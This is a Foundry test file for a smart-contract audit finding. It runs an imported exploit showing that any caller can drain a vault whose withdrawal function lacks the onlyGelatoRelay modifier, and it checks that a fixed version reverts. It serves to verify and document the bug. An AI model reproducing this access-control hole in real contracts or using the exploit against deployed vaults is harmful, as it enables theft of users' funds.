// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    MockToken,
    TradableSideVaultFixed
} from "./44920-missing-onlygelatorelay-modifier-zokyo-none-tradable-markdow.sol";

contract Finding44920Test is Test {
    function test_exploit_any_caller_withdraws() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e)), 1000 ether, "caller received 1000");
        assertEq(e.token().balanceOf(address(e.vault())), 0, "vault emptied");
        assertTrue(address(e) != e.vault().gelato(), "caller is not gelato");
        emit log_named_uint("caller_balance", e.token().balanceOf(address(e)));
        emit log_named_uint("vault_balance", e.token().balanceOf(address(e.vault())));
    }

    function test_control_restricts_caller() public {
        MockToken token = new MockToken();
        address gelato = address(0x3333);
        TradableSideVaultFixed vault = new TradableSideVaultFixed(token, gelato);
        token.mint(address(vault), 1000 ether);

        vm.expectRevert(bytes("onlyGelatoRelay"));
        vault.withdrawalRequestForUser(
            TradableSideVaultFixed.WithdrawalType.Margin,
            address(token),
            1000 ether
        );

        assertEq(token.balanceOf(address(vault)), 1000 ether, "vault kept 1000");
        assertEq(token.balanceOf(address(this)), 0, "caller received nothing");
        emit log_named_uint("control_vault_balance", token.balanceOf(address(vault)));
    }
}
